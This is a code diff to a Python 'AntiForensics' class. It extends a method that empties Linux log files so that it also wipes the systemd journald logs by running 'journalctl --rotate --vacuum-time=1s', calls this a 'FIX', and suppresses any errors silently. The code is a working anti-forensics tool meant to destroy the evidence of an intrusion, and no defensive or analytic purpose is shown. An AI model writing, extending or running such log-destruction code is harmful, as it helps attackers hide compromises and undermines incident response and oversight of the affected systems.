@@ -244,7 +244,7 @@ class AntiForensics:
     # ============ LINUX METHODS ============
 
     def clear_linux_logs(self) -> bool:
-        """Clear Linux log files"""
+        """Clear Linux log files including journald"""
         if self.os_type != "Linux":
             return False
 
@@ -268,6 +268,20 @@ class AntiForensics:
                         with open(log_file, "w") as f:
                             f.write("")
                         logger.debug(f"Cleared {log_file}")
+                    except Exception:
+                        pass
+
+            # FIX: Clear systemd journald logs
+            journal_dirs = ["/var/log/journal", "/run/log/journal"]
+            for journal_dir in journal_dirs:
+                if os.path.exists(journal_dir):
+                    try:
+                        import subprocess
+                        subprocess.run(
+                            ["journalctl", "--rotate", "--vacuum-time=1s"],
+                            capture_output=True, timeout=10
+                        )
+                        logger.debug(f"Cleared journald logs in {journal_dir}")
                     except Exception:
                         pass
 
